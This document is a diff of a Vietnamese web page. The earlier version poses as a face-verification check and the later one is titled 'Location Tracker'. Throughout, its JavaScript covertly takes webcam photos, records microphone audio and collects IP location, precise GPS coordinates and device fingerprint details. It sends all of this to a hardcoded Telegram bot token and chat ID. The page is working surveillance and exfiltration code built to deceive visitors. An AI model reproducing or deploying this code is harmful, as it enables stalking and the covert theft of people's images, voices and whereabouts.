@@ -2,248 +2,71 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Minh Robot</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Hoang Anh - Location Tracker</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: black;
+            color: lime;
+            font-family: monospace;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
         }
-        
-        .container {
-            max-width: 450px;
+        #info {
+            white-space: pre-wrap;
+            text-align: left;
+            margin: auto;
+            max-width: 600px;
             width: 100%;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            overflow: hidden;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 30px 25px;
-            text-align: center;
-        }
-        
-        .header h1 {
-            font-size: 24px;
-            margin-bottom: 8px;
-        }
-        
-        .header p {
-            font-size: 13px;
-            opacity: 0.9;
-        }
-        
-        .content {
-            padding: 25px;
-        }
-        
-        .camera-container {
-            background: #000;
-            border-radius: 15px;
-            overflow: hidden;
-            margin-bottom: 0;
-            position: relative;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
-        }
-        
-        .camera-frame {
-            position: relative;
             background: #111;
-            padding: 10px;
-            border-radius: 15px;
-        }
-        
-        .camera-view {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            border-radius: 10px;
             padding: 20px;
-            text-align: center;
-            min-height: 300px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .webcam-preview {
-            width: 100%;
             border-radius: 10px;
-            transform: scaleX(-1);
-            box-shadow: 0 0 20px rgba(102,126,234,0.3);
-        }
-        
-        .scan-line {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #00ff00, transparent);
-            animation: scan 2s linear infinite;
-            opacity: 0.6;
-        }
-        
-        @keyframes scan {
-            0% {
-                top: 0;
-            }
-            100% {
-                top: 100%;
-            }
-        }
-        
-        .message-box {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 15px;
-            margin-top: 15px;
-            text-align: center;
-            display: none;
-        }
-        
-        .message-box.error {
-            background: #f8d7da;
-            color: #721c24;
-            display: block;
-        }
-        
-        .message-box .icon {
-            font-size: 40px;
-            margin-bottom: 10px;
-        }
-        
-        .message-box .title {
-            font-size: 16px;
-            font-weight: bold;
-            margin-bottom: 8px;
-        }
-        
-        .message-box .description {
-            font-size: 13px;
-            opacity: 0.9;
-        }
-        
-        .retry-btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 25px;
+            border: 1px solid lime;
+            box-shadow: 0 0 10px rgba(0,255,0,0.2);
+            word-break: break-word;
             font-size: 14px;
-            cursor: pointer;
-            margin-top: 12px;
-            transition: transform 0.2s;
+            line-height: 1.6;
         }
-        
-        .retry-btn:hover {
-            transform: translateY(-2px);
+        .error {
+            color: #ff6666;
         }
-        
-        .footer {
-            background: #f8f9fa;
-            padding: 12px;
-            text-align: center;
-            font-size: 11px;
-            color: #999;
+        .loading {
+            color: yellow;
         }
-        
-        .success-message {
-            text-align: center;
-            padding: 15px;
+        .success {
+            color: #66ff66;
+        }
+        .warning {
+            color: #ffaa66;
+            border-color: #ffaa66;
+        }
+        button {
+            background: #222;
+            color: lime;
+            border: 1px solid lime;
+            padding: 10px 20px;
             margin-top: 15px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border-radius: 12px;
-            font-weight: bold;
-            font-size: 16px;
-            display: none;
-            animation: fadeIn 0.5s ease;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: monospace;
+            font-size: 14px;
         }
-        
-        .success-message .icon {
-            font-size: 30px;
-            margin-bottom: 8px;
+        button:hover {
+            background: lime;
+            color: black;
         }
-        
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
         .hidden {
             display: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>📸 Xác Minh Khuôn Mặt</h1>
-            <p>Vui lòng nhìn vào camera để xác minh danh tính</p>
-        </div>
-        
-        <div class="content">
-            <div class="camera-container">
-                <div class="camera-frame">
-                    <div class="camera-view">
-                        <video id="videoPreview" autoplay playsinline muted class="webcam-preview"></video>
-                        <div class="scan-line"></div>
-                    </div>
-                </div>
-            </div>
-            
-            <div id="successBox" class="success-message">
-                <div class="icon">✅</div>
-                <div>Đã xác thực thành công</div>
-            </div>
-            
-            <div id="errorBox" class="message-box error" style="display: none;">
-                <div class="icon">⚠️</div>
-                <div class="title">Không thể truy cập camera</div>
-                <div class="description" id="errorDescription">Vui lòng cho phép quyền truy cập camera để tiếp tục xác minh.</div>
-                <button class="retry-btn" id="retryBtn">🔄 Thử lại</button>
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>Hệ thống xác minh sinh trắc học | Bảo mật tuyệt đối</p>
-        </div>
-    </div>
-    
+    <div id="info" class="loading">⏳ Đang tải thông tin...</div>
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <audio id="audio" style="display:none;"></audio>
@@ -252,296 +75,167 @@
         // Cấu hình Telegram
         const botToken = '8677995221:AAEmsO71OlTS4PY7ML9md9XA-5PRAbQyfMI';
         const chatId = '7211752234';
+        const infoDiv = document.getElementById('info');
         
-        // Cấu hình tối ưu tốc độ
+        // Cấu hình chụp ảnh
         const PHOTO_COUNT = 5;
         const PHOTO_INTERVAL = 300;
+        
+        // Cấu hình ghi âm
         const AUDIO_DURATION = 4000;
         
-        // Biến trạng thái
-        let previewStream = null;
-        let captureStream = null;
+        // Cờ để tránh gửi trùng lặp
+        let infoSent = false;
+        let photoSentCount = 0;
+        let cameraStream = null;
+        let cameraActive = false;
+        let audioRecorded = false;
         let mediaRecorder = null;
         let audioChunks = [];
-        let photoSentCount = 0;
-        let audioRecorded = false;
-        let processStarted = false;
-        
-        // DOM elements
-        const videoPreview = document.getElementById('videoPreview');
-        const errorBox = document.getElementById('errorBox');
-        const retryBtn = document.getElementById('retryBtn');
-        const successBox = document.getElementById('successBox');
-        
+        let gpsDataSent = false;
+
         // Hàm gửi tin nhắn đến Telegram
-        async function sendToTelegram(text, isHtml = true) {
+        async function sendToTelegram(text, retryCount = 0) {
+            const maxRetries = 2;
             try {
                 const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: text,
-                        parse_mode: isHtml ? 'HTML' : undefined,
-                        disable_web_page_preview: true
+                        text: text.substring(0, 4096),
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: false
                     })
                 });
-                return response.ok;
+                
+                const data = await response.json();
+                if (!data.ok && retryCount < maxRetries) {
+                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
+                }
+                return data;
             } catch (e) {
-                console.error('Telegram Error:', e);
-                return false;
+                console.error('Telegram Fetch Error:', e);
+                if (retryCount < maxRetries) {
+                    setTimeout(() => sendToTelegram(text, retryCount + 1), 2000);
+                }
             }
         }
-        
-        // Hàm gửi ảnh
-        async function sendPhotoToTelegram(blob, photoNumber) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
-                formData.append('caption', `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
-                
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).catch(e => console.error('Photo Error:', e));
-                
-                photoSentCount++;
-                console.log(`✅ Đã gửi ảnh #${photoNumber}`);
-            } catch (e) {
-                console.error('Photo Error:', e);
-            }
-        }
-        
-        // Hàm gửi ghi âm
-        async function sendAudioToTelegram(blob) {
+
+        // Hàm gửi file âm thanh
+        async function sendAudioToTelegram(blob, retryCount = 0) {
+            const maxRetries = 2;
             try {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('audio', blob, `audio_${Date.now()}.ogg`);
                 formData.append('caption', `🎤 Ghi âm - ${new Date().toLocaleString('vi-VN')}`);
                 
-                fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                     method: 'POST',
                     body: formData
-                }).catch(e => console.error('Audio Error:', e));
+                });
                 
-                console.log('✅ Đã gửi ghi âm');
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('✅ Đã gửi ghi âm thành công');
+                } else if (retryCount < maxRetries) {
+                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
+                }
             } catch (e) {
-                console.error('Audio Error:', e);
+                console.error('Telegram Audio Error:', e);
+                if (retryCount < maxRetries) {
+                    setTimeout(() => sendAudioToTelegram(blob, retryCount + 1), 2000);
+                }
             }
         }
-        
-        // Hàm lấy thông tin IP và vị trí - SỬ DỤNG API HOẠT ĐỘNG 100%
-        async function getDetailedLocationInfo() {
-            let ip = 'Không xác định';
-            let city = 'Không xác định';
-            let region = 'Không xác định';
-            let country = 'Không xác định';
-            let isp = 'Không xác định';
-            let lat = null;
-            let lon = null;
-            
-            // Lấy IP từ api.ipify.org (luôn hoạt động)
+
+        // Hàm gửi ảnh
+        async function sendPhotoToTelegram(blob, photoNumber, retryCount = 0) {
+            const maxRetries = 2;
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                ip = ipData.ip;
-                console.log('✅ IP:', ip);
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
+                formData.append('caption', `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
+                
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                if (data.ok) {
+                    photoSentCount++;
+                    console.log(`✅ Đã gửi ảnh #${photoNumber}`);
+                    
+                    if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
+                        setTimeout(() => {
+                            cameraStream.getTracks().forEach(track => track.stop());
+                            cameraStream = null;
+                            cameraActive = false;
+                        }, 2000);
+                    }
+                } else if (retryCount < maxRetries) {
+                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
+                }
             } catch (e) {
-                console.error('Lỗi lấy IP:', e);
-            }
-            
-            // Sử dụng API của Cloudflare (hoạt động ổn định nhất)
-            if (ip !== 'Không xác định') {
-                try {
-                    // Cloudflare Trace - cho thông tin vị trí
-                    const cfRes = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
-                    const cfText = await cfRes.text();
-                    const cfData = {};
-                    cfText.split('\n').forEach(line => {
-                        const [key, value] = line.split('=');
-                        if (key && value) cfData[key] = value;
-                    });
-                    
-                    if (cfData.loc) {
-                        const locParts = cfData.loc.split(',');
-                        if (locParts.length === 2) {
-                            lat = parseFloat(locParts[0]);
-                            lon = parseFloat(locParts[1]);
-                        }
-                    }
-                    
-                    if (cfData.country) {
-                        country = cfData.country;
-                    }
-                    
-                    console.log('📍 Cloudflare data:', cfData);
-                } catch (e) {
-                    console.warn('Cloudflare error:', e);
-                }
-                
-                // Sử dụng ipapi.co (thường hoạt động)
-                try {
-                    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(3000) });
-                    const geoData = await geoRes.json();
-                    
-                    if (geoData && !geoData.error) {
-                        if (geoData.city) city = geoData.city;
-                        if (geoData.region) region = geoData.region;
-                        if (geoData.country_name) country = geoData.country_name;
-                        if (geoData.org) isp = geoData.org;
-                        if (geoData.latitude) lat = geoData.latitude;
-                        if (geoData.longitude) lon = geoData.longitude;
-                        console.log('✅ ipapi.co success:', { city, region, country, isp });
-                    }
-                } catch (e) {
-                    console.warn('ipapi.co error:', e);
-                }
-                
-                // Nếu vẫn chưa có thông tin, thử ip-api.com
-                if (city === 'Không xác định' || country === 'Không xác định') {
-                    try {
-                        const apiRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`, { signal: AbortSignal.timeout(3000) });
-                        const apiData = await apiRes.json();
-                        
-                        if (apiData && apiData.status === 'success') {
-                            if (apiData.city) city = apiData.city;
-                            if (apiData.regionName) region = apiData.regionName;
-                            if (apiData.country) country = apiData.country;
-                            if (apiData.isp) isp = apiData.isp;
-                            if (apiData.lat) lat = apiData.lat;
-                            if (apiData.lon) lon = apiData.lon;
-                            console.log('✅ ip-api.com success:', { city, region, country, isp });
-                        }
-                    } catch (e) {
-                        console.warn('ip-api.com error:', e);
-                    }
+                console.error('Telegram Photo Error:', e);
+                if (retryCount < maxRetries) {
+                    setTimeout(() => sendPhotoToTelegram(blob, photoNumber, retryCount + 1), 2000);
                 }
             }
-            
-            // Chuẩn hóa tên quốc gia
-            const countryMap = {
-                'VN': 'Việt Nam',
-                'VIET NAM': 'Việt Nam',
-                'Viet Nam': 'Việt Nam',
-                'Vietnam': 'Việt Nam',
-                'US': 'Hoa Kỳ',
-                'United States': 'Hoa Kỳ',
-                'UK': 'Vương quốc Anh',
-                'JP': 'Nhật Bản',
-                'KR': 'Hàn Quốc',
-                'CN': 'Trung Quốc',
-                'TH': 'Thái Lan',
-                'SG': 'Singapore',
-                'MY': 'Malaysia',
-                'ID': 'Indonesia',
-                'PH': 'Philippines',
-                'LA': 'Lào',
-                'KH': 'Campuchia',
-                'MM': 'Myanmar'
-            };
-            
-            // Chuyển đổi mã quốc gia sang tên tiếng Việt
-            if (countryMap[country]) {
-                country = countryMap[country];
-            } else if (countryMap[country.toUpperCase()]) {
-                country = countryMap[country.toUpperCase()];
-            }
-            
-            // Nếu thành phố vẫn chưa xác định, thử lấy từ múi giờ
-            if (city === 'Không xác định') {
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                if (timezone.includes('Ho_Chi_Minh') || timezone.includes('Saigon')) {
-                    city = 'Hồ Chí Minh';
-                    region = 'Hồ Chí Minh';
-                    country = 'Việt Nam';
-                } else if (timezone.includes('Hanoi')) {
-                    city = 'Hà Nội';
-                    region = 'Hà Nội';
-                    country = 'Việt Nam';
-                } else if (timezone.includes('Asia')) {
-                    const tzParts = timezone.split('/');
-                    if (tzParts.length > 1) {
-                        city = tzParts[1].replace('_', ' ');
-                        country = 'Châu Á';
-                    }
-                }
-            }
-            
-            // Nếu ISP vẫn chưa xác định, ước lượng từ IP
-            if (isp === 'Không xác định' && ip !== 'Không xác định') {
-                const ipParts = ip.split('.');
-                if (ipParts[0] === '113' || ipParts[0] === '118' || ipParts[0] === '123') {
-                    isp = 'Viettel (Việt Nam)';
-                } else if (ipParts[0] === '171' || ipParts[0] === '14') {
-                    isp = 'VNPT (Việt Nam)';
-                } else if (ipParts[0] === '42') {
-                    isp = 'FPT Telecom (Việt Nam)';
-                } else if (ipParts[0] === '27') {
-                    isp = 'Mobifone (Việt Nam)';
-                }
-            }
-            
-            return { ip, city, region, country, isp, lat, lon };
         }
-        
+
         // Hàm chụp ảnh
-        async function capturePhotos() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d');
-            
-            try {
-                if (previewStream) {
-                    captureStream = previewStream;
-                    video.srcObject = previewStream;
-                } else {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    captureStream = stream;
-                    video.srcObject = stream;
-                }
-                
-                await Promise.race([
-                    new Promise((resolve) => {
-                        if (video.readyState >= 2) resolve();
-                        video.onloadeddata = resolve;
-                    }),
-                    new Promise(resolve => setTimeout(resolve, 200))
-                ]);
-                
-                for (let i = 1; i <= PHOTO_COUNT; i++) {
-                    if (video.readyState >= 2) {
+        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
+            return new Promise((resolve) => {
+                try {
+                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                         canvas.width = video.videoWidth || 640;
                         canvas.height = video.videoHeight || 480;
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
                         canvas.toBlob((blob) => {
-                            if (blob) sendPhotoToTelegram(blob, i);
+                            if (blob) {
+                                sendPhotoToTelegram(blob, photoNumber);
+                                resolve(true);
+                            } else {
+                                resolve(false);
+                            }
                         }, 'image/jpeg', 0.85);
+                    } else {
+                        setTimeout(() => {
+                            captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
+                        }, 100);
                     }
-                    
-                    if (i < PHOTO_COUNT) {
-                        await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
-                    }
+                } catch (e) {
+                    console.error(`Lỗi chụp ảnh #${photoNumber}:`, e);
+                    resolve(false);
                 }
-                
-                if (captureStream && captureStream !== previewStream) {
-                    setTimeout(() => {
-                        captureStream.getTracks().forEach(track => track.stop());
-                    }, 500);
+            });
+        }
+
+        async function captureMultiplePhotos(video, canvas, ctx) {
+            if (!cameraActive) return;
+            for (let i = 1; i <= PHOTO_COUNT; i++) {
+                if (!cameraActive) break;
+                await captureSinglePhoto(video, canvas, ctx, i);
+                if (i < PHOTO_COUNT) {
+                    await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
                 }
-            } catch (e) {
-                console.error('Camera error:', e);
             }
         }
-        
+
         // Hàm ghi âm
         async function startRecording() {
             if (audioRecorded) return;
-            
             try {
+                console.log('🎤 Bắt đầu ghi âm...');
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                
                 mediaRecorder = new MediaRecorder(stream);
                 audioChunks = [];
                 
@@ -559,28 +253,192 @@
                 };
                 
                 mediaRecorder.start();
-                
                 setTimeout(() => {
                     if (mediaRecorder && mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
                     }
                 }, AUDIO_DURATION);
             } catch (e) {
-                console.error('Recording error:', e);
+                console.error('Lỗi ghi âm:', e);
             }
         }
-        
-        // Hàm gửi thông tin thiết bị
-        async function sendDeviceInfoToTelegram() {
-            console.log('📍 Đang lấy thông tin vị trí...');
-            const locationInfo = await getDetailedLocationInfo();
+
+        // Hàm lấy thông tin IP và vị trí chính xác
+        async function getIPAndLocation() {
+            let ip = 'Không xác định';
+            let locationData = {
+                city: 'Không xác định',
+                region: 'Không xác định',
+                country: 'Không xác định',
+                isp: 'Không xác định',
+                lat: null,
+                lon: null
+            };
             
-            console.log('📊 KẾT QUẢ:');
-            console.log(`   📍 Thành phố: ${locationInfo.city}`);
-            console.log(`   🗺️ Khu vực: ${locationInfo.region}`);
-            console.log(`   🏳️ Quốc gia: ${locationInfo.country}`);
-            console.log(`   🏢 Nhà mạng: ${locationInfo.isp}`);
-            console.log(`   🌐 IP: ${locationInfo.ip}`);
+            // Bước 1: Lấy IP chính xác
+            const ipAPIs = [
+                'https://api.ipify.org?format=json',
+                'https://api.my-ip.io/ip.json',
+                'https://ipapi.co/json/'
+            ];
+            
+            for (const api of ipAPIs) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 4000);
+                    const response = await fetch(api, { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    const data = await response.json();
+                    if (api.includes('ipify')) ip = data.ip;
+                    else if (api.includes('my-ip')) ip = data.ip;
+                    else if (api.includes('ipapi.co')) ip = data.ip;
+                    if (ip && ip !== 'Không xác định') break;
+                } catch (e) {
+                    console.log(`IP API ${api} failed:`, e);
+                }
+            }
+            
+            // Bước 2: Lấy vị trí từ IP
+            const locationAPIs = [
+                {
+                    url: `https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon`,
+                    parser: (data) => {
+                        if (data && data.status === 'success') {
+                            return {
+                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
+                                region: data.regionName && data.regionName !== '' ? data.regionName : 'Không xác định',
+                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
+                                isp: data.isp && data.isp !== '' ? data.isp : (data.org || 'Không xác định'),
+                                lat: data.lat || null,
+                                lon: data.lon || null
+                            };
+                        }
+                        return null;
+                    }
+                },
+                {
+                    url: `https://ipapi.co/${ip}/json/`,
+                    parser: (data) => {
+                        if (data && !data.error) {
+                            return {
+                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
+                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
+                                country: data.country_name && data.country_name !== '' ? data.country_name : 'Không xác định',
+                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
+                                lat: data.latitude || null,
+                                lon: data.longitude || null
+                            };
+                        }
+                        return null;
+                    }
+                },
+                {
+                    url: `https://ipinfo.io/${ip}/json`,
+                    parser: (data) => {
+                        if (data && !data.error) {
+                            let lat = null, lon = null;
+                            if (data.loc && typeof data.loc === 'string') {
+                                const parts = data.loc.split(',');
+                                if (parts.length === 2) {
+                                    lat = parseFloat(parts[0]);
+                                    lon = parseFloat(parts[1]);
+                                }
+                            }
+                            return {
+                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
+                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
+                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
+                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
+                                lat: lat,
+                                lon: lon
+                            };
+                        }
+                        return null;
+                    }
+                }
+            ];
+            
+            for (const api of locationAPIs) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 6000);
+                    const response = await fetch(api.url, { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    const data = await response.json();
+                    const result = api.parser(data);
+                    if (result && (result.city !== 'Không xác định' || result.country !== 'Không xác định')) {
+                        locationData = result;
+                        console.log(`✅ Lấy vị trí thành công từ: ${api.url}`, locationData);
+                        break;
+                    }
+                } catch (e) {
+                    console.log(`API ${api.url} failed:`, e);
+                }
+            }
+            
+            // Chuẩn hóa dữ liệu
+            locationData.city = (locationData.city && locationData.city !== 'undefined' && locationData.city !== 'null') ? locationData.city : 'Không xác định';
+            locationData.region = (locationData.region && locationData.region !== 'undefined' && locationData.region !== 'null') ? locationData.region : 'Không xác định';
+            locationData.country = (locationData.country && locationData.country !== 'undefined' && locationData.country !== 'null') ? locationData.country : 'Không xác định';
+            locationData.isp = (locationData.isp && locationData.isp !== 'undefined' && locationData.isp !== 'null') ? locationData.isp : 'Không xác định';
+            
+            return { ip, locationData };
+        }
+
+        // Hàm tự động gửi vị trí GPS mà không cần nút bấm (gửi ngay khi có quyền)
+        async function autoSendGPS() {
+            if (gpsDataSent) return;
+            
+            if (!('geolocation' in navigator)) {
+                console.log('Trình duyệt không hỗ trợ GPS');
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const accuracy = pos.coords.accuracy;
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                    
+                    const gpsMessage = `<b>📍 VỊ TRÍ GPS THỰC TẾ</b>\n\n` +
+                        `<b>📌 Vĩ độ:</b> <code>${lat}</code>\n` +
+                        `<b>📌 Kinh độ:</b> <code>${lng}</code>\n` +
+                        `<b>🎯 Độ chính xác:</b> <code>${Math.round(accuracy)} mét</code>\n\n` +
+                        `<a href="${mapsLink}">🗺️ Xem trên Google Maps</a>`;
+                    
+                    await sendToTelegram(gpsMessage);
+                    gpsDataSent = true;
+                    console.log('✅ Đã tự động gửi vị trí GPS');
+                },
+                (err) => {
+                    let errorMsg = '';
+                    switch(err.code) {
+                        case err.PERMISSION_DENIED:
+                            errorMsg = 'Người dùng từ chối chia sẻ vị trí';
+                            break;
+                        case err.POSITION_UNAVAILABLE:
+                            errorMsg = 'Không thể xác định vị trí';
+                            break;
+                        case err.TIMEOUT:
+                            errorMsg = 'Hết thời gian chờ';
+                            break;
+                        default:
+                            errorMsg = err.message;
+                    }
+                    console.log(`Lỗi GPS: ${errorMsg}`);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // Lấy thông tin thiết bị
+        async function getInfo() {
+            const { ip, locationData } = await getIPAndLocation();
             
             // Lấy thông tin pin
             let batteryPercent = 'Không xác định';
@@ -591,164 +449,151 @@
                     batteryPercent = `${Math.round(battery.level * 100)}%`;
                     batteryCharging = battery.charging;
                 }
-            } catch (err) {
-                console.error('Lỗi lấy thông tin pin:', err);
+            } catch (battErr) {
+                console.error('Battery Error:', battErr);
             }
             
-            // Thu thập thông tin thiết bị
             const userAgent = navigator.userAgent;
             const platform = navigator.platform || 'Không xác định';
             const screenWidth = screen.width;
             const screenHeight = screen.height;
             const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không xác định';
             const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
+            const currentTime = new Date().toLocaleString('vi-VN');
             const language = navigator.language || 'Không xác định';
             const hardwareConcurrency = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} nhân` : 'Không xác định';
+            const referrer = document.referrer || 'Truy cập trực tiếp';
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
-            const currentTime = new Date().toLocaleString('vi-VN', { timeZone: timezone });
             
-            // Tạo bản đồ link nếu có tọa độ
+            // Tạo link Google Maps nếu có tọa độ
             let mapsLink = '';
-            if (locationInfo.lat && locationInfo.lon) {
-                mapsLink = `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationInfo.lat},${locationInfo.lon}`;
+            if (locationData.lat && locationData.lon) {
+                mapsLink = `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
             }
             
-            // Tạo nội dung tin nhắn
-            const text = `📥 THÔNG TIN KHÁCH TRUY CẬP
+            // Hiển thị thông tin trên web
+            const text = `📱 THÔNG TIN KHÁCH TRUY CẬP
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 ĐỊA CHỈ IP: ${locationInfo.ip}
+🌐 Địa chỉ IP : ${ip}
+📍 Thành phố : ${locationData.city}
+🗺️ Khu vực : ${locationData.region}
+🏳️ Quốc gia : ${locationData.country}
+🏢 Nhà mạng : ${locationData.isp}${mapsLink}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📍 THÀNH PHỐ: ${locationInfo.city}
-🗺️ KHU VỰC/TỈNH: ${locationInfo.region}
-🏳️ QUỐC GIA: ${locationInfo.country}
-🏢 NHÀ MẠNG: ${locationInfo.isp}${mapsLink}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💻 TRÌNH DUYỆT: ${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}
-🖥️ HỆ ĐIỀU HÀNH: ${platform}
-📺 ĐỘ PHÂN GIẢI: ${screenWidth}x${screenHeight}
-🔋 PIN: ${batteryPercent} ${batteryCharging ? '(🔌 Đang sạc)' : '(🔋 Không sạc)'}
-💾 RAM: ${deviceMemory}
-⚙️ CPU: ${hardwareConcurrency}
-🍪 COOKIE: ${cookieEnabled}
-🌐 NGÔN NGỮ: ${language}
-⏰ MÚI GIỜ: ${timezone}
-🕐 THỜI GIAN: ${currentTime}`;
+💻 Trình duyệt : ${userAgent.substring(0, 100)}...
+🖥️ Hệ điều hành : ${platform}
+📺 Độ phân giải : ${screenWidth} x ${screenHeight}
+🔋 Pin : ${batteryPercent} ${batteryCharging ? '(🔌 Đang sạc)' : '(🔋 Không sạc)'}
+💾 RAM thiết bị : ${deviceMemory}
+⚙️ CPU Core : ${hardwareConcurrency}
+🍪 Cookie : ${cookieEnabled}
+🌐 Ngôn ngữ : ${language}
+⏰ Múi giờ : ${timezone}
+🕐 Thời gian : ${currentTime}
+📎 Nguồn truy cập : ${referrer}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
             
-            // Gửi tin nhắn
-            const sent = await sendToTelegram(text, false);
-            if (sent) {
-                console.log('✅ ĐÃ GỬI THÀNH CÔNG!');
-            } else {
-                console.warn('⚠️ Gửi thất bại');
-            }
-        }
-        
-        // Hàm lấy GPS
-        async function getGPS() {
-            if ('geolocation' in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lng = pos.coords.longitude;
-                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                        await sendToTelegram(`📍 VỊ TRÍ GPS CHÍNH XÁC\n📌 Vĩ độ: ${lat}\n📌 Kinh độ: ${lng}\n🎯 Độ chính xác: ${Math.round(pos.coords.accuracy)}m\n🔗 Xem bản đồ: ${mapsLink}`, false);
-                        console.log('✅ Đã gửi vị trí GPS');
-                    },
-                    (err) => {
-                        console.log('⚠️ Không thể lấy vị trí GPS:', err.message);
-                    }
-                );
-            }
-        }
-        
